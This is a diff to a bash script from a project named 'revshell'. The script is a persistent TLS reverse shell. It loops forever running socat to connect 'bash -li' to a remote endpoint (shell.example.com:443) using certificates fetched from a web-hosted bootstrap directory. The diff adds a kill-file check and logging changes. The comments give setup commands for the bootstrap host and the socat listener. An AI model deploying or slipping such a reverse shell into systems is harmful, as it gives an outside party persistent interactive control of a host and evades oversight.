@@ -15,20 +15,33 @@
 # Bootstrap host usage example:
 # 
 # $ mkdir /var/www/html/bd7751b6ec39
-# $ echo -n "example.com:443" > /var/www/html/bd7751b6ec39/endpoint
+# $ echo -n "shell.example.com:443" > /var/www/html/bd7751b6ec39/endpoint
 # $ cp ca/keys/ca.crt /var/www/html/bd7751b6ec39/ca
-# $ cat ca/keys/example.com.crt ca/keys/example.com.key > /var/www/html/bd7751b6ec39/cert
+# $ cat ca/keys/client.crt ca/keys/client.key > /var/www/html/bd7751b6ec39/cert
 #
 # Server usage example:
 # 
-# $ cat ca/keys/example.com.crt ca/keys/example.com.key > server.pem
+# $ cat ca/keys/shell.example.com.crt ca/keys/shell.example.com.key > server.pem
 # $ socat file:`tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=server.pem,cafile=ca/keys/ca.crt
 #
 # For more information, see "https://github.com/doctor-love/revshell
 
-function wait_forever {
-	while true; do sleep 300s; echo "INFO: Still alive at $(date)..."; done
+function check_kill_file {
+		if [[ -O "/tmp/kill_revshell" ]]; then
+			echo "INFO: Detected \"kill file\" - shutting down..."
+			rm --force "/tmp/kill_revshell"
+			exit 0
 
+		fi
+}
+
+function wait_forever {
+	while true; do
+		check_kill_file
+		echo "INFO: Still alive at $(date --iso-8601=s)..."
+		sleep 60s
+	
+	done
 }
 
 which grep curl socat &> /dev/null
@@ -87,7 +100,8 @@ while true; do
 	socat exec:'bash -li',pty,stderr,setsid,sigint,sane \
 	"openssl-connect:${ENDPOINT},cert=${BASE_PATH}/cert,cafile=${BASE_PATH}/ca"
 
-	echo "INFO: Reconnecting to \"${ENDPOINT}\" at $(date --date '10 seconds')..."
+	check_kill_file
+	echo "INFO: Will reconnect to \"${ENDPOINT}\" at $(date --iso-8601=s --date '10 seconds')..."
 	sleep 10s
 
 done
